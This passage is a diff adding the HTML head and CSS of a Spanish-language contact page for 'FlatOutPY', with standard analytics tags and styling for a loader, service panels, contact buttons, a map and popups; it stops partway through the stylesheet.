@@ -1,0 +1,1623 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Rastreamento-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "ubtnk1qp9f");
+    </script>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-ETLKCDMT5S"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'G-ETLKCDMT5S');
+    </script>
+    <!-- Favicons -->
+    <link rel="apple-touch-icon" sizes="180x180" href="favicon/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="favicon/favicon-16x16.png">
+    <link rel="manifest" href="favicon/site.webmanifest">
+    <link rel="shortcut icon" href="favicon/favicon.ico">
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+    <title>FlatOutPY - Contacto</title>
+    <style>
+        /* ========================================
+           LOADING SCREEN
+           ======================================== */
+        #loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #121212;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        #loading-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loader-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 180px;
+            height: 180px;
+            font-family: "Montserrat", sans-serif;
+            font-size: 1.4rem;
+            font-weight: 300;
+            color: #D1D1D1;
+            border-radius: 50%;
+            background-color: transparent;
+            user-select: none;
+        }
+
+        .loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            border-radius: 50%;
+            background-color: transparent;
+            animation: loader-rotate 2s linear infinite;
+            z-index: 0;
+        }
+
+        @keyframes loader-rotate {
+            0% {
+                transform: rotate(90deg);
+                box-shadow:
+                    0 10px 20px 0 #D1D1D1 inset,
+                    0 20px 30px 0 #D62828 inset,
+                    0 60px 60px 0 #A4161A inset;
+            }
+            50% {
+                transform: rotate(270deg);
+                box-shadow:
+                    0 10px 20px 0 #D1D1D1 inset,
+                    0 20px 10px 0 #D62828 inset,
+                    0 40px 60px 0 #2C2C2C inset;
+            }
+            100% {
+                transform: rotate(450deg);
+                box-shadow:
+                    0 10px 20px 0 #D1D1D1 inset,
+                    0 20px 30px 0 #D62828 inset,
+                    0 60px 60px 0 #A4161A inset;
+            }
+        }
+
+        .loader-letter {
+            display: inline-block;
+            opacity: 0.4;
+            transform: translateY(0);
+            animation: loader-letter-anim 2s infinite;
+            z-index: 1;
+            border-radius: 50ch;
+            border: none;
+        }
+
+        .loader-letter:nth-child(1) {
+            animation-delay: 0s;
+        }
+        .loader-letter:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+        .loader-letter:nth-child(3) {
+            animation-delay: 0.2s;
+        }
+        .loader-letter:nth-child(4) {
+            animation-delay: 0.3s;
+        }
+        .loader-letter:nth-child(5) {
+            animation-delay: 0.4s;
+        }
+        .loader-letter:nth-child(6) {
+            animation-delay: 0.5s;
+        }
+        .loader-letter:nth-child(7) {
+            animation-delay: 0.6s;
+        }
+        .loader-letter:nth-child(8) {
+            animation-delay: 0.7s;
+        }
+        .loader-letter:nth-child(9) {
+            animation-delay: 0.8s;
+        }
+        .loader-letter:nth-child(10) {
+            animation-delay: 0.9s;
+        }
+
+        @keyframes loader-letter-anim {
+            0%,
+            100% {
+                opacity: 0.4;
+                transform: translateY(0);
+            }
+            20% {
+                opacity: 1;
+                transform: scale(1.15);
+            }
+            40% {
+                opacity: 0.7;
+                transform: translateY(0);
+            }
+        }
+
+        /* ========================================
+           PRESET DE CORES - FLATOUT PY
+           ======================================== */
+        :root {
+            /* Primary - Preto profundo (fundo principal) */
+            --color-primary: #121212;
+            --color-primary-rgb: 18, 18, 18;
+            
+            /* Secondary - Cinza grafite (fundo secundário) */
+            --color-secondary: #2C2C2C;
+            --color-secondary-rgb: 44, 44, 44;
+            
+            /* Detail - Cinza claro (texto, bordas, detalhes) */
+            --color-detail: #D1D1D1;
+            --color-detail-rgb: 209, 209, 209;
+            
+            /* Destaque - Vermelho destaque (botões, títulos, call-to-action) */
+            --color-destaque: #ff0000;
+            --color-destaque-rgb: 214, 40, 40;
+            
+            /* Hover - Vermelho escuro (hover, estados ativos, contraste) */
+            --color-hover: #A4161A;
+            --color-hover-rgb: 164, 22, 26;
+        }
+
+        * {
+            cursor: crosshair !important;
+            box-sizing: border-box;
+        }
+        
+        html {
+            overflow-x: hidden;
+            max-width: 100vw;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            font-optical-sizing: auto;
+            font-weight: 400;
+            font-style: normal;
+            background-color: rgb(9, 9, 9);
+            overflow-x: hidden;
+            max-width: 100vw;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Efeito de Poeira 3D */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 20% 50%, rgba(46, 0, 0, 0.25) 0%, transparent 50%),
+                radial-gradient(circle at 80% 80%, rgba(46, 0, 0, 0.15) 0%, transparent 50%),
+                radial-gradient(circle at 40% 20%, rgba(46, 0, 0, 0.22) 0%, transparent 50%),
+                radial-gradient(circle at 60% 60%, rgba(46, 0, 0, 0.18) 0%, transparent 50%),
+                radial-gradient(circle at 10% 90%, rgba(46, 0, 0, 0.20) 0%, transparent 50%),
+                radial-gradient(circle at 90% 30%, rgba(46, 0, 0, 0.16) 0%, transparent 50%);
+            background-size: 200% 200%, 180% 180%, 220% 220%, 190% 190%, 210% 210%, 200% 200%;
+            background-position: 0% 0%, 100% 100%, 50% 50%, 30% 70%, 80% 20%, 60% 40%;
+            animation: dustMove 20s ease-in-out infinite;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                radial-gradient(circle at 30% 40%, rgba(46, 0, 0, 0.12) 0%, transparent 40%),
+                radial-gradient(circle at 70% 70%, rgba(46, 0, 0, 0.10) 0%, transparent 40%),
+                radial-gradient(circle at 50% 10%, rgba(46, 0, 0, 0.14) 0%, transparent 40%),
+                radial-gradient(circle at 15% 60%, rgba(46, 0, 0, 0.11) 0%, transparent 40%),
+                radial-gradient(circle at 85% 25%, rgba(46, 0, 0, 0.09) 0%, transparent 40%);
+            background-size: 250% 250%, 230% 230%, 240% 240%, 220% 220%, 260% 260%;
+            background-position: 20% 20%, 80% 80%, 50% 50%, 10% 90%, 90% 10%;
+            animation: dustMove 25s ease-in-out infinite reverse;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        @keyframes dustMove {
+            0%, 100% {
+                background-position: 0% 0%, 100% 100%, 50% 50%, 30% 70%, 80% 20%, 60% 40%;
+            }
+            25% {
+                background-position: 15% 10%, 85% 90%, 55% 45%, 40% 65%, 75% 25%, 50% 45%;
+            }
+            50% {
+                background-position: 30% 20%, 70% 80%, 60% 40%, 50% 60%, 70% 30%, 40% 50%;
+            }
+            75% {
+                background-position: 15% 10%, 85% 90%, 55% 45%, 40% 65%, 75% 25%, 50% 45%;
+            }
+        }
+
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1.5rem;
+            position: relative;
+            z-index: 1;
+            padding: 0 1rem;
+            box-sizing: border-box;
+        }
+
+        /* Header */
+        .header {
+            width: 100%;
+            background-color: #000000;
+            position: relative;
+            overflow: hidden;
+            padding: 4rem 1rem;
+            margin: 0;
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 200px;
+            box-sizing: border-box;
+            align-self: stretch;
+        }
+
+        /* Container para partículas de poeira */
+        .dust-container {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            overflow: hidden;
+        }
+
+        .dust-particle {
+            position: absolute;
+            pointer-events: none;
+            will-change: transform, opacity;
+            transform-origin: center;
+        }
+
+        /* Logo */
+        .logo-container {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+        }
+
+        .logo-container img {
+            max-height: 5rem;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* Descrição */
+        .description {
+            text-align: center;
+            color: var(--color-detail);
+            font-size: 1.2rem;
+            line-height: 1.6;
+            max-width: 800px;
+            padding: 0 1rem;
+            letter-spacing: 0.2em;
+        }
+
+        /* Container de Botões de Serviços */
+        .services-container {
+            display: flex;
+            flex-direction: column;
+            gap: 1.5rem;
+            width: calc(100% - 2rem);
+            max-width: 1200px;
+            margin: 0 auto;
+            margin-bottom: 0;
+        }
+
+        /* Espaçamento mínimo entre botões para evitar toques acidentais */
+        .service-item-wrapper {
+            margin-bottom: 0.5rem;
+        }
+
+        /* Botão de Categoria */
+        .service-button {
+            background: rgba(255, 0, 0, 0.436);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-top: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 15px;
+            padding: 1.5rem 3.5rem 1.5rem 1.5rem;
+            color: rgb(255, 255, 255);
+            font-size: 1.2rem;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            position: relative;
+            overflow: visible;
+            backdrop-filter: blur(10px);
+            /* Box-shadow 3D - Profundidade e elevação */
+            box-shadow: 
+                /* Sombra externa profunda - cria a base 3D */
+                0 16px 48px rgba(0, 0, 0, 0.7),
+                /* Sombra média - define a forma */
+                0 6px 20px rgba(0, 0, 0, 0.5),
+                /* Sombra próxima - detalhe fino */
+                0 2px 8px rgba(0, 0, 0, 0.4),
+                /* Brilho vermelho sutil */
+                0 0 30px rgba(255, 0, 0, 0.2),
+                /* Sombra interna superior - profundidade */
+                inset 0 2px 4px rgba(0, 0, 0, 0.4),
+                /* Highlight interno sutil - brilho superior */
+                inset 0 -2px 6px rgba(0, 0, 0, 0.3),
+                /* Brilho interno superior sutil */
+                inset 0 1px 0 rgba(255, 255, 255, 0.08);
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 0.25em;
+            text-transform: uppercase;
+            z-index: 2;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            min-height: 60px;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            user-select: none;
+        }
+
+        /* Indicador de seta/chevron - estilo aba */
+        .service-button::after {
+            content: '▼';
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.9);
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1), color 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            text-shadow: 0 0 8px rgba(255, 255, 255, 0.5);
+            position: absolute;
+            right: 1.5rem;
+        }
+
+
+        /* Seta rotaciona quando ativo */
+        .service-button.active::after {
+            transform: rotate(180deg);
+            color: rgba(255, 255, 255, 1);
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.8);
+        }
+
+        /* Efeito ripple ao tocar */
+        .service-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.4s ease, height 0.4s ease, opacity 0.4s ease;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Estado ativo ao tocar - feedback imediato */
+        .service-button:active {
+            transform: scale(0.97);
+            background: rgba(255, 0, 0, 0.6);
+            border-top: 3px solid rgba(255, 255, 255, 0.4);
+            /* Box-shadow 3D pressionado - mais próximo da superfície */
+            box-shadow: 
+                /* Sombra externa reduzida - botão pressionado */
+                0 8px 24px rgba(0, 0, 0, 0.8),
+                /* Sombra média reduzida */
+                0 3px 12px rgba(0, 0, 0, 0.6),
+                /* Sombra próxima */
+                0 1px 4px rgba(0, 0, 0, 0.5),
+                /* Brilho vermelho intensificado */
+                0 0 25px rgba(255, 0, 0, 0.5),
+                /* Sombra interna superior intensificada - pressionado */
+                inset 0 3px 8px rgba(0, 0, 0, 0.6),
+                /* Sombra interna inferior */
+                inset 0 -2px 8px rgba(0, 0, 0, 0.5),
+                /* Brilho interno reduzido */
+                inset 0 1px 0 rgba(255, 255, 255, 0.05);
+            border-color: rgba(255, 255, 255, 0.25);
+        }
+
+        .service-button:active::after {
+            transform: scale(0.9);
+        }
+
+        .service-button:active::before {
+            width: 300px;
+            height: 300px;
+            opacity: 1;
+            transition: width 0.3s ease, height 0.3s ease, opacity 0.2s ease;
+        }
+
+        .service-button.active {
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            background: rgba(255, 0, 0, 0.55);
+            border-top: 3px solid rgba(255, 255, 255, 0.5);
+            border-color: rgba(255, 255, 255, 0.3);
+            /* Box-shadow 3D quando ativo - mais elevação */
+            box-shadow: 
+                /* Sombra externa profunda intensificada */
+                0 20px 60px rgba(0, 0, 0, 0.8),
+                /* Sombra média ampliada */
+                0 8px 24px rgba(0, 0, 0, 0.6),
+                /* Sombra próxima */
+                0 3px 10px rgba(0, 0, 0, 0.5),
+                /* Brilho vermelho mais intenso */
+                0 0 40px rgba(255, 0, 0, 0.4),
+                /* Sombra interna superior */
+                inset 0 2px 5px rgba(0, 0, 0, 0.5),
+                /* Highlight interno */
+                inset 0 -2px 8px rgba(0, 0, 0, 0.4),
+                /* Brilho interno superior */
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .service-button.active:active {
+            transform: scale(0.97);
+            background: rgba(255, 0, 0, 0.7);
+            /* Box-shadow 3D quando ativo e pressionado */
+            box-shadow: 
+                0 12px 36px rgba(0, 0, 0, 0.9),
+                0 5px 16px rgba(0, 0, 0, 0.7),
+                0 2px 6px rgba(0, 0, 0, 0.6),
+                0 0 30px rgba(255, 0, 0, 0.6),
+                inset 0 3px 10px rgba(0, 0, 0, 0.7),
+                inset 0 -2px 10px rgba(0, 0, 0, 0.6),
+                inset 0 1px 0 rgba(255, 255, 255, 0.06);
+        }
+
+        /* Estado focus para acessibilidade (navegação por teclado) */
+        .service-button:focus-visible {
+            outline: 3px solid rgba(255, 0, 0, 0.6);
+            outline-offset: 3px;
+        }
+
+        /* Painel de Serviços que desce */
+        .service-panel {
+            background: rgba(0, 0, 0, 0.15);
+            border: white;
+            border-top: 2px solid rgba(var(--color-destaque-rgb), 0);
+            border-radius: 0 0 24px 24px;
+            padding: 0;
+            color: var(--color-detail);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            /* Box-shadow 3D - Profundidade e elevação */
+            box-shadow: 
+                /* Sombra externa profunda - cria a base 3D */
+                0 20px 60px rgba(0, 0, 0, 0.8),
+                /* Sombra média - define a forma */
+                0 8px 24px rgba(0, 0, 0, 0.6),
+                /* Sombra próxima - detalhe fino */
+                0 2px 8px rgba(0, 0, 0, 0.4),
+                /* Sombra interna superior - profundidade */
+                inset 0 2px 4px rgba(0, 0, 0, 0.5),
+                /* Highlight interno sutil - brilho superior */
+                inset 0 -2px 8px rgba(0, 0, 0, 0.3);
+            max-height: 0;
+            opacity: 0;
+            transform: translateY(-30px) scale(0.98);
+            transition: all 0.6s cubic-bezier(0.34, 1.56, 0.64, 1);
+            margin-top: -1.5rem;
+            margin-bottom: 0.5rem;
+            z-index: 1;
+            width: 100%;
+        }
+
+        .service-panel::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, 
+                transparent 0%,
+                rgba(var(--color-destaque-rgb), 0.8) 50%,
+                transparent 100%);
+            opacity: 0;
+            transition: opacity 0.6s ease 0.2s;
+        }
+
+        .service-panel.active {
+            max-height: 2000px;
+            opacity: 1;
+            transform: translateY(0) scale(1);
+            padding: 3rem;
+            margin-bottom: 1rem;
+            border-top-color: rgba(var(--color-destaque-rgb), 0.5);
+            /* Box-shadow 3D intensificado quando ativo - mais elevação */
+            box-shadow: 
+                /* Sombra externa profunda - elevação máxima */
+                0 30px 80px rgba(0, 0, 0, 0.9),
+                /* Sombra média ampliada */
+                0 12px 32px rgba(0, 0, 0, 0.7),
+                /* Sombra próxima - definição */
+                0 4px 12px rgba(0, 0, 0, 0.5),
+                /* Brilho vermelho sutil nas bordas */
+                0 0 50px rgba(var(--color-destaque-rgb), 0.25),
+                /* Sombra interna superior - profundidade */
+                inset 0 2px 6px rgba(0, 0, 0, 0.6),
+                /* Highlight interno sutil */
+                inset 0 -3px 10px rgba(0, 0, 0, 0.4),
+                /* Brilho interno superior sutil */
+                inset 0 1px 0 rgba(255, 255, 255, 0.03);
+        }
+
+        .service-panel.active::before {
+            opacity: 1;
+        }
+
+        .service-panel .service-list {
+            opacity: 0;
+            transform: translateY(10px);
+            transition: all 0.4s ease 0.1s;
+        }
+
+        .service-panel.active .service-list {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .service-box {
+            display: none;
+        }
+
+        /* Container de Selos */
+        .seals-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 2rem;
+            width: 100%;
+            margin-bottom: 2rem;
+            flex-wrap: wrap;
+        }
+
+        .seal {
+            max-width: 120px;
+            max-height: 120px;
+            width: auto;
+            height: auto;
+            object-fit: contain;
+            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.3));
+            transition: transform 0.3s ease;
+        }
+
+        .seal:active {
+            transform: scale(0.95);
+            transition: transform 0.15s ease;
+        }
+
+        .services-title {
+            font-size: 2rem;
+            font-weight: 600;
+            color: var(--color-detail);
+            text-align: center;
+            width: 100%;
+            margin-bottom: 0.5rem;
+            letter-spacing: 0.25em;
+            text-transform: uppercase;
+        }
+
+        .service-category {
+            font-size: 1.4rem;
+            font-weight: 600;
+            color: var(--color-destaque);
+            margin-top: 1.5rem;
+            margin-bottom: 1.2rem;
+            text-align: center;
+            letter-spacing: 0.25em;
+            text-transform: uppercase;
+        }
+
+        .service-category:first-of-type {
+            margin-top: 0;
+        }
+
+        .service-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .service-list li {
+            padding: 0.6rem 0;
+            padding-left: 1.8rem;
+            position: relative;
+            line-height: 1.7;
+            letter-spacing: 0.05rem;
+            transition: color 0.3s ease;
+        }
+
+        .service-list li::before {
+            content: "▸";
+            position: absolute;
+            left: 0;
+            color: var(--color-destaque);
+            font-weight: bold;
+            font-size: 1.5rem;
+            opacity: 0.8;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .service-list li:active {
+            color: rgba(var(--color-detail-rgb), 0.95);
+        }
+
+        .service-list li:active::before {
+            opacity: 1;
+            transform: translateX(2px);
+        }
+
+        .service-item {
+            margin-bottom: 0.4rem;
+            font-size: 1.05rem;
+        }
+
+        /* Botões de Contato */
+        .contact-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 1.2rem;
+            width: 100%;
+            max-width: 500px;
+        }
+
+        .contact-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            padding: 1.2rem 2rem;
+            background: linear-gradient(135deg, rgba(var(--color-secondary-rgb), 0.8) 0%, rgba(var(--color-primary-rgb), 0.9) 100%);
+            border: 2px solid rgba(var(--color-detail-rgb), 0.15);
+            border-radius: 15px;
+            color: var(--color-detail);
+            text-decoration: none;
+            font-size: 1.1rem;
+            font-weight: 500;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            /* Box-shadow 3D - Profundidade e elevação */
+            box-shadow: 
+                /* Sombra externa profunda - cria a base 3D */
+                0 16px 48px rgba(var(--color-primary-rgb), 0.8),
+                /* Sombra média - define a forma */
+                0 6px 20px rgba(var(--color-primary-rgb), 0.6),
+                /* Sombra próxima - detalhe fino */
+                0 2px 8px rgba(0, 0, 0, 0.5),
+                /* Sombra interna superior - profundidade */
+                inset 0 2px 4px rgba(0, 0, 0, 0.4),
+                /* Highlight interno sutil - brilho superior */
+                inset 0 -2px 6px rgba(0, 0, 0, 0.3),
+                /* Brilho interno superior sutil */
+                inset 0 1px 0 rgba(var(--color-detail-rgb), 0.12);
+            width: 100%;
+            min-height: 56px;
+            position: relative;
+            overflow: hidden;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            user-select: none;
+        }
+
+        /* Efeito ripple ao tocar */
+        .contact-button::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(var(--color-destaque-rgb), 0.2);
+            transform: translate(-50%, -50%);
+            transition: width 0.4s ease, height 0.4s ease, opacity 0.4s ease;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        /* Estado ativo ao tocar - feedback imediato e claro */
+        .contact-button:active {
+            transform: scale(0.96);
+            background: linear-gradient(135deg, rgba(var(--color-secondary-rgb), 0.95) 0%, rgba(var(--color-primary-rgb), 0.98) 100%);
+            border-color: rgba(var(--color-destaque-rgb), 0.5);
+            color: var(--color-destaque);
+            /* Box-shadow 3D pressionado - mais próximo da superfície */
+            box-shadow: 
+                /* Sombra externa reduzida - botão pressionado */
+                0 8px 24px rgba(var(--color-primary-rgb), 0.9),
+                /* Sombra média reduzida */
+                0 3px 12px rgba(var(--color-primary-rgb), 0.7),
+                /* Sombra próxima */
+                0 1px 4px rgba(0, 0, 0, 0.6),
+                /* Brilho vermelho intensificado */
+                0 0 30px rgba(var(--color-destaque-rgb), 0.5),
+                /* Sombra interna superior intensificada - pressionado */
+                inset 0 3px 8px rgba(0, 0, 0, 0.6),
+                /* Sombra interna inferior */
+                inset 0 -2px 8px rgba(0, 0, 0, 0.5),
+                /* Brilho interno reduzido */
+                inset 0 1px 0 rgba(var(--color-detail-rgb), 0.08);
+        }
+
+        .contact-button:active::before {
+            width: 400px;
+            height: 400px;
+            opacity: 1;
+            transition: width 0.3s ease, height 0.3s ease, opacity 0.2s ease;
+        }
+
+        /* Estado focus para acessibilidade (navegação por teclado) */
+        .contact-button:focus-visible {
+            outline: 3px solid rgba(var(--color-destaque-rgb), 0.6);
+            outline-offset: 3px;
+        }
+
+        /* Melhor feedback visual para ícones ao tocar */
+        .contact-button:active svg {
+            transform: scale(1.1);
+            transition: transform 0.2s ease;
+        }
+
+        .contact-button svg {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: transform 0.2s ease;
+        }
+
+        .contact-button span {
+            text-align: center;
+        }
+
+        .contact-button .whatsapp-icon {
+            fill: currentColor;
+        }
+
+        .contact-button .instagram-icon {
+            fill: currentColor;
+        }
+
+        .contact-button .location-icon {
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        .contact-button .location-icon path,
+        .contact-button .location-icon circle {
+            stroke: currentColor;
+            fill: none;
+            stroke-width: 2;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header {
+                padding: 3rem 1rem;
+                min-height: 15rem;
+            }
+
+            .logo-container img {
+                max-height: 2rem;
+            }
+
+            .service-button {
+                padding: 1.2rem 1.5rem;
+                font-size: 1rem;
+                min-height: 56px;
+            }
+
+            .service-panel.active {
+                padding: 2rem 1.5rem;
+            }
+
+            .seals-container {
+                gap: 1.5rem;
+                margin-bottom: 1.5rem;
+            }
+
+            .seal {
+                max-width: 90px;
+                max-height: 90px;
+            }
+
+            .services-title {
+                font-size: 1.4rem;
+            }
+
+            .service-category {
+                font-size: 1.4rem;
+                margin-bottom: 1rem;
+            }
+
+            .description {
+                font-size: 0.88rem;
+            }
+
+            .contact-button {
+                padding: 1rem 1.5rem;
+                font-size: 1rem;
+                min-height: 52px;
+            }
+
+            .contact-buttons {
+                max-width: 100%;
+            }
+
+            .footer {
+                font-size: 1rem;
+            }
+
+            .map-wrapper {
+                height: 300px;
+            }
+
+            .map-title {
+                font-size: 1.7rem;
+            }
+        }
+
+        /* Media query específica para telas muito verticais (celulares em retrato) */
+        @media (max-width: 480px) and (orientation: portrait) {
+            .header {
+                padding: 2.5rem 1rem;
+                min-height: 12rem;
+            }
+
+            .logo-container img {
+                max-width: 80%;
+                max-height: 3.5rem;
+            }
+        }
+
+        /* Media query para telas muito pequenas e verticais */
+        @media (max-width: 360px) {
+            .header {
+                padding: 2rem 0.8rem;
+                min-height: 10rem;
+            }
+
+            .logo-container img {
+                max-width: 80%;
+                max-height: 3rem;
+            }
+        }
+
+        /* Footer */
+        /* Mapa */
+        .map-container {
+            width: 100%;
+            max-width: 1200px;
+            margin-top: 0;
+            position: relative;
+            z-index: 1;
+        }
+
+        .map-section-wrapper {
+            position: relative;
+            width: 100%;
+            background-color: #00000000;
+            padding: 2rem 1rem;
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+            overflow: hidden;
+            box-sizing: border-box;
+            align-self: stretch;
+        }
+
+        .map-section-wrapper .container {
+            position: relative;
+            z-index: 1;
+        }
+
+        .contact-buttons {
+            position: relative;
+            z-index: 1;
+        }
+
+        .map-title {
+            font-size: 2rem;
+            font-weight: 600;
+            color: var(--color-detail);
+            text-align: center;
+            width: 100%;
+            margin-bottom: 1.5rem;
+            letter-spacing: 0.2em;
+        }
+
+        .map-wrapper {
+            width: 100%;
+            height: 450px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 
+                0 10px 40px rgba(var(--color-primary-rgb), 0.6),
+                inset 0 1px 0 rgba(var(--color-detail-rgb), 0.1);
+            border: 2px solid rgba(var(--color-detail-rgb), 0.15);
+            margin-top: 2rem;
+        }
+
+        #map {
+            width: 100%;
+            height: 100%;
+        }
+
+        .footer {
+            width: 100%;
+            text-align: center;
+            color: var(--color-detail);
+            font-size: 1rem;
+            padding: 2rem 1rem;
+            opacity: 0.7;
+        }
+
+        .service-item-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        /* Botão de Download */
+        .download-button {
+            margin-top: 1.5rem;
+            padding: 1rem 2rem;
+            background: rgba(18, 76, 0, 0.432);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            color: rgb(255, 255, 255);
+            font-size: 1rem;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
+            letter-spacing: 0.1em;
+            text-transform: uppercase;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 48px;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            user-select: none;
+            box-shadow: 
+                0 8px 24px rgba(0, 0, 0, 0.6),
+                0 3px 10px rgba(0, 0, 0, 0.4),
+                inset 0 1px 0 rgba(255, 255, 255, 0.1);
+        }
+
+        .download-button:active {
+            transform: scale(0.97);
+            box-shadow: 
+                0 4px 12px rgba(0, 0, 0, 0.7),
+                0 1px 4px rgba(0, 0, 0, 0.5),
+                inset 0 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Popup Overlay */
+        .popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            padding: 1rem;
+            box-sizing: border-box;
+        }
+
+        .popup-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        /* Popup Container */
+        .popup-container {
+            position: relative;
+            max-width: 90%;
+            max-height: 90vh;
+            background: rgba(0, 0, 0, 0.9);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            padding: 0;
+            box-shadow: 
+                0 20px 60px rgba(0, 0, 0, 0.9),
+                0 8px 24px rgba(0, 0, 0, 0.7),
+                0 0 40px rgba(255, 0, 0, 0.3);
+            transform: scale(0.9);
+            transition: transform 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
+            overflow: hidden;
+        }
+
+        .popup-overlay.active .popup-container {
+            transform: scale(1);
+        }
+
+        /* Botão de Fechar */
+        .popup-close {
+            position: absolute;
+            top: 1rem;
+            right: 1rem;
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 0, 0, 0.8);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            color: white;
+            font-size: 1.7rem;
+            font-weight: bold;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10001;
+            transition: all 0.2s ease;
+            -webkit-tap-highlight-color: transparent;
+            touch-action: manipulation;
+            box-shadow: 
+                0 4px 12px rgba(0, 0, 0, 0.6),
+                0 0 15px rgba(255, 0, 0, 0.4);
